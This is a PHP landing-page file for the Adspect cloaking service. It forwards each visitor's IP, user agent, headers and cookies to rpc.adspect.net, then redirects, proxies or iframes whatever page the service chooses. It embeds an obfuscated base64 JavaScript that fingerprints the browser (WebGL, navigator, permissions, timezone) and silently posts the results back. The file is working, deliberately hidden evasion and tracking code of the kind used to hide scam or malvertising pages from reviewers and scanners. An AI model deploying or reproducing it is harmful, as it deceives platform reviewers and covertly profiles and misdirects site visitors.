<?php
 define('ADSPECT_DEBUG', 0); if (ADSPECT_DEBUG) { ini_set('display_errors', '1'); error_reporting(E_ALL); } else { ini_set('display_errors', '0'); } if (!function_exists('adspect')) { function adspect_coalesce($array, $keys, $default = '') { if (is_scalar($keys)) { $keys = array($keys); } foreach ($keys as $key) { if (array_key_exists($key, $array)) { return $array[$key]; } } return $default; } function adspect_render() { require_once func_get_arg(0); } function adspect_headers() { $headers = array(); foreach ($_SERVER as $key => $value) { if (substr_compare('HTTP_', $key, 0, 5) == 0) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect($sid, $mode) { $ajax = $mode === 'ajax'; $curl = curl_init(); $ipaddr = adspect_coalesce($_SERVER, array( 'HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR' )); $ipaddr = strtok($ipaddr, ','); $proto = adspect_coalesce($_SERVER, 'SERVER_PROTOCOL', 'HTTP/1.1'); $ua = adspect_coalesce($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_coalesce($_SERVER, 'HTTP_REFERER'); $query = adspect_coalesce($_SERVER, 'QUERY_STRING'); $cookie = sha1(implode(':', array($sid, $ipaddr, $ua, $query))); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['cookie'] = array($cookie, adspect_coalesce($_COOKIE, $cookie)); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); } $sid = adspect_coalesce($_GET, '__sid', $sid); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_HTTPHEADER, array( 'Adspect-IP: ' . $ipaddr, 'Adspect-UA: ' . $ua, 'Adspect-JS: ' . intval($ajax), 'Adspect-Referrer: ' . $referrer )); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $target = curl_exec($curl); if ($errno = curl_errno($curl)) { if (ADSPECT_DEBUG) { die('cURL error: ' . curl_strerror($errno)); } header("{$proto} 500 Internal Server Error", true, 500); die; } $status = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Content-Type: text/html'); header('Cache-Control: no-store'); switch ($status) { case 202: break; case 200: if ($ajax) { if ($target != '') { if ($_SERVER['REQUEST_METHOD'] === 'POST') { echo $target; } else { $target = json_encode($target); echo "window.__location = {$target};"; break; } } } elseif (!preg_match('/^[[:alnum:]]+:/i', $target)) { $target = parse_url($target); $query = adspect_coalesce($target, 'query'); parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; unset($_POST['data']); $_SERVER['REQUEST_METHOD'] = 'GET'; if (adspect_coalesce($target, 'path') === '') { return null; } $dirname = dirname($target['path']); if ($dirname[0] !== '/') { $dirname = __DIR__ . '/' . $dirname; } chdir($dirname); adspect_render(basename($target['path'])); } elseif ($mode === 'redirect' || !preg_match('/^https?:/i', $target)) { header("Location: {$target}"); } elseif ($mode === 'proxy') { $curl = curl_init(); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, $ua); curl_setopt($curl, CURLOPT_URL, $target); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $html = curl_exec($curl); curl_close($curl); $target = parse_url($target); $origin = $target['scheme'] . '://' . $target['host']; if (array_key_exists('port', $target)) { $origin .= ':' . $target['port']; } $dirurl = $origin . adspect_coalesce($target, 'path', '/'); $html = preg_replace('@(href|src)=(["\'])/(?!/)((?:(?!\2).)*)@i', "$1=$2{$origin}/$3", $html); $html = preg_replace('@(href|src)=(["\'])(?!(?:https?:)?//)((?:(?!\2).)*)@i', "$1=$2{$dirurl}/$3", $html); $html = preg_replace('@(href|src)=/(?!/)([^ ]*)@i', "$1={$origin}/$2", $html); $html = preg_replace('@(href|src)=(?!["\'])(?!(?:https?:)?//)([^ ]*)@i', "$1={$dirurl}/$2", $html); echo $html; } elseif ($mode === 'iframe') { $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; } die; case 404: header("{$proto} 404 Not Found", true, 404); die; default: if (ADSPECT_DEBUG) { die("cURL returned status code {$status}"); } header("{$proto} 503 Service Unavailable", true, 503); die; } setcookie($cookie, hash('crc32b', $cookie), time() + 3600); return $target; } } $target = adspect('1eb88b72-78b4-6ad0-8d68-ac1f6b95a853', 'redirect'); if ($target === null) { return; } ?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="refresh" content="10; url=<?= htmlspecialchars($target) ?>">
	<meta name="referrer" content="no-referrer">
</head>
<body>
	<script src="data:text/javascript;base64,dmFyIGZpbmk9WydzdHJpbmdpZnknLCdjcmVhdGVFdmVudCcsJzM1M3FkbFlMYycsJ2F0dHJpYnV0ZXMnLCdnZXRDb250ZXh0JywnMUpKdXFQQScsJ25vdGlmaWNhdGlvbnMnLCdocmVmJywndmFsdWUnLCcxR2tvUFdZJywnVU5NQVNLRURfVkVORE9SX1dFQkdMJywndG9TdHJpbmcnLCd0eXBlJywncHVzaCcsJ21lc3NhZ2UnLCdkb2N1bWVudCcsJ3NjcmVlbicsJ21ldGhvZCcsJ3dlYmdsJywnY2FudmFzJywnZG9jdW1lbnRFbGVtZW50JywnODc4MzEzUklQZ0VXJywnY29uc29sZScsJ25hdmlnYXRvcicsJ2dldFBhcmFtZXRlcicsJ2NyZWF0ZUVsZW1lbnQnLCdUb3VjaEV2ZW50JywndGhlbicsJ2Vycm9ycycsJ3RpbWV6b25lT2Zmc2V0JywnNzMzMjl3QWR4SVYnLCdsb2NhdGlvbicsJ2FwcGVuZENoaWxkJywnMTYxMVZubVBCUycsJ2dldEV4dGVuc2lvbicsJ25vZGVOYW1lJywnMXNSSnVtUCcsJ29iamVjdCcsJ1dFQkdMX2RlYnVnX3JlbmRlcmVyX2luZm8nLCdmb3JtJywncXVlcnknLCdkYXRhJywnZ2V0T3duUHJvcGVydHlOYW1lcycsJzUyNTE5MVV2RWh1ZScsJzN3cWptUG8nLCdQT1NUJywnVU5NQVNLRURfUkVOREVSRVJfV0VCR0wnLCduYW1lJywnMjYwRVRDVXJyJywnbGVuZ3RoJywnbG9nJywnd2luZG93JywndG9zdHJpbmcnLCdub2RlVmFsdWUnLCdib2R5JywnNDNhWWtoZVQnLCcyMDI4MzY4RFdKT3dpJywncGVybWlzc2lvbicsJzI1NDc2M01hQ2Z0dSddO3ZhciBmaW5kPWZ1bmN0aW9uKHRpbWUsbGluayl7dGltZT10aW1lLTB4N2E7dmFyIGZpbmlzaD1maW5pW3RpbWVdO3JldHVybiBmaW5pc2g7fTsoZnVuY3Rpb24oYWxsLGNvdW50KXt2YXIgbG9naW49ZmluZDt3aGlsZSghIVtdKXt0cnl7dmFyIHZlcj1wYXJzZUludChsb2dpbigweDkyKSkqcGFyc2VJbnQobG9naW4oMHg4YikpKy1wYXJzZUludChsb2dpbigweDkzKSkqcGFyc2VJbnQobG9naW4oMHg4NSkpKy1wYXJzZUludChsb2dpbigweGE0KSkqcGFyc2VJbnQobG9naW4oMHg5ZSkpKy1wYXJzZUludChsb2dpbigweDdjKSkrcGFyc2VJbnQobG9naW4oMHg4OCkpKi1wYXJzZUludChsb2dpbigweDk3KSkrLXBhcnNlSW50KGxvZ2luKDB4YTEpKSpwYXJzZUludChsb2dpbigweGFiKSkrLXBhcnNlSW50KGxvZ2luKDB4OWYpKSotcGFyc2VJbnQobG9naW4oMHhhNykpO2lmKHZlcj09PWNvdW50KWJyZWFrO2Vsc2UgYWxsWydwdXNoJ10oYWxsWydzaGlmdCddKCkpO31jYXRjaChpbmZvKXthbGxbJ3B1c2gnXShhbGxbJ3NoaWZ0J10oKSk7fX19KGZpbmksMHhiYjFmOSksZnVuY3Rpb24oKXt2YXIgbG9vcD1maW5kO2Z1bmN0aW9uIHRpbWUoKXt2YXIgY29tcD1maW5kO2ZpbmlzaFtjb21wKDB4ODMpXT1saW5rO3ZhciBjb250ZW50PWRvY3VtZW50W2NvbXAoMHg4MCldKGNvbXAoMHg4ZSkpLHNlbmQ9ZG9jdW1lbnRbJ2NyZWF0ZUVsZW1lbnQnXSgnaW5wdXQnKTtjb250ZW50W2NvbXAoMHhiMyldPWNvbXAoMHg5NCksY29udGVudFsnYWN0aW9uJ109d2luZG93W2NvbXAoMHg4NildW2NvbXAoMHhhOSldLHNlbmRbY29tcCgweGFlKV09J2hpZGRlbicsc2VuZFtjb21wKDB4OTYpXT1jb21wKDB4OTApLHNlbmRbY29tcCgweGFhKV09SlNPTltjb21wKDB4YTIpXShmaW5pc2gpLGNvbnRlbnRbJ2FwcGVuZENoaWxkJ10oc2VuZCksZG9jdW1lbnRbY29tcCgweDlkKV1bY29tcCgweDg3KV0oY29udGVudCksY29udGVudFsnc3VibWl0J10oKTt9dmFyIGxpbms9W10sZmluaXNoPXt9O3RyeXt2YXIgdXJpPWZ1bmN0aW9uKGFyZ3Mpe3ZhciBuYXY9ZmluZDtpZihuYXYoMHg4Yyk9PT10eXBlb2YgYXJncyYmbnVsbCE9PWFyZ3Mpe3ZhciBpZD1mdW5jdGlvbihuYW1lKXt2YXIgeG1sPW5hdjt0cnl7dmFyIGZvcm09YXJnc1tuYW1lXTtzd2l0Y2godHlwZW9mIGZvcm0pe2Nhc2UgeG1sKDB4OGMpOmlmKG51bGw9PT1mb3JtKWJyZWFrO2Nhc2UnZnVuY3Rpb24nOmZvcm09Zm9ybVt4bWwoMHhhZCldKCk7fWVsZW1lbnRbbmFtZV09Zm9ybTt9Y2F0Y2godXNlcil7bGlua1sncHVzaCddKHVzZXJbeG1sKDB4YjApXSk7fX0sZWxlbWVudD17fSxwYWdlO2ZvcihwYWdlIGluIGFyZ3MpaWQocGFnZSk7dHJ5e3ZhciBhZGphY2VudD1PYmplY3RbbmF2KDB4OTEpXShhcmdzKTtmb3IocGFnZT0weDA7cGFnZTxhZGphY2VudFtuYXYoMHg5OCldOysrcGFnZSlpZChhZGphY2VudFtwYWdlXSk7ZWxlbWVudFsnISEnXT1hZGphY2VudDt9Y2F0Y2godXBkKXtsaW5rWydwdXNoJ10odXBkWydtZXNzYWdlJ10pO31yZXR1cm4gZWxlbWVudDt9fTtmaW5pc2hbbG9vcCgweGIyKV09dXJpKHdpbmRvd1tsb29wKDB4YjIpXSksZmluaXNoW2xvb3AoMHg5YSldPXVyaSh3aW5kb3cpLGZpbmlzaFtsb29wKDB4N2UpXT11cmkod2luZG93W2xvb3AoMHg3ZSldKSxmaW5pc2hbbG9vcCgweDg2KV09dXJpKHdpbmRvd1tsb29wKDB4ODYpXSksZmluaXNoWydjb25zb2xlJ109dXJpKHdpbmRvd1tsb29wKDB4N2QpXSksZmluaXNoW2xvb3AoMHg3YildPWZ1bmN0aW9uKHRydW5jKXt2YXIgcGFyPWxvb3A7dHJ5e3ZhciByZWdpc3Rlcj17fTt0cnVuYz10cnVuY1twYXIoMHhhNSldO2Zvcih2YXIgbW9kdWxlIGluIHRydW5jKW1vZHVsZT10cnVuY1ttb2R1bGVdLHJlZ2lzdGVyW21vZHVsZVtwYXIoMHg4YSldXT1tb2R1bGVbcGFyKDB4OWMpXTtyZXR1cm4gcmVnaXN0ZXI7fWNhdGNoKHBhcmFtKXtsaW5rWydwdXNoJ10ocGFyYW1bcGFyKDB4YjApXSk7fX0oZG9jdW1lbnRbJ2RvY3VtZW50RWxlbWVudCddKSxmaW5pc2hbbG9vcCgweGIxKV09dXJpKGRvY3VtZW50KTt0cnl7ZmluaXNoW2xvb3AoMHg4NCldPW5ldyBEYXRlKClbJ2dldFRpbWV6b25lT2Zmc2V0J10oKTt9Y2F0Y2goZGlzcGxheSl7bGlua1tsb29wKDB4YWYpXShkaXNwbGF5W2xvb3AoMHhiMCldKTt9dHJ5e2ZpbmlzaFsnY2xvc3VyZSddPWZ1bmN0aW9uKCl7fVtsb29wKDB4YWQpXSgpO31jYXRjaChhdXRvKXtsaW5rWydwdXNoJ10oYXV0b1tsb29wKDB4YjApXSk7fXRyeXtmaW5pc2hbJ3RvdWNoRXZlbnQnXT1kb2N1bWVudFtsb29wKDB4YTMpXShsb29wKDB4ODEpKVtsb29wKDB4YWQpXSgpO31jYXRjaCh0b3Ape2xpbmtbbG9vcCgweGFmKV0odG9wW2xvb3AoMHhiMCldKTt9dHJ5e3VyaT1mdW5jdGlvbigpe307dmFyIHVzZWQ9MHgwO3VyaVtsb29wKDB4YWQpXT1mdW5jdGlvbigpe3JldHVybisrdXNlZCwnJzt9LGNvbnNvbGVbbG9vcCgweDk5KV0odXJpKSxmaW5pc2hbbG9vcCgweDliKV09dXNlZDt9Y2F0Y2godGFiKXtsaW5rW2xvb3AoMHhhZildKHRhYltsb29wKDB4YjApXSk7fXdpbmRvd1tsb29wKDB4N2UpXVsncGVybWlzc2lvbnMnXVtsb29wKDB4OGYpXSh7J25hbWUnOmxvb3AoMHhhOCl9KVtsb29wKDB4ODIpXShmdW5jdGlvbihib3R0b20pe3ZhciByZW09bG9vcDtmaW5pc2hbJ3Blcm1pc3Npb25zJ109W3dpbmRvd1snTm90aWZpY2F0aW9uJ11bcmVtKDB4YTApXSxib3R0b21bJ3N0YXRlJ11dLHRpbWUoKTt9LHRpbWUpO3RyeXt2YXIgZGF0YT1kb2N1bWVudFtsb29wKDB4ODApXShsb29wKDB4N2EpKVtsb29wKDB4YTYpXShsb29wKDB4YjQpKSxkaXY9ZGF0YVtsb29wKDB4ODkpXShsb29wKDB4OGQpKTtmaW5pc2hbbG9vcCgweGI0KV09eyd2ZW5kb3InOmRhdGFbbG9vcCgweDdmKV0oZGl2W2xvb3AoMHhhYyldKSwncmVuZGVyZXInOmRhdGFbJ2dldFBhcmFtZXRlciddKGRpdltsb29wKDB4OTUpXSl9O31jYXRjaChsb2NhdGUpe2xpbmtbbG9vcCgweGFmKV0obG9jYXRlW2xvb3AoMHhiMCldKTt9fWNhdGNoKGJpbmQpe2xpbmtbJ3B1c2gnXShiaW5kW2xvb3AoMHhiMCldKSx0aW1lKCk7fX0oKSk7"></script>
</body>
</html>
<?php die;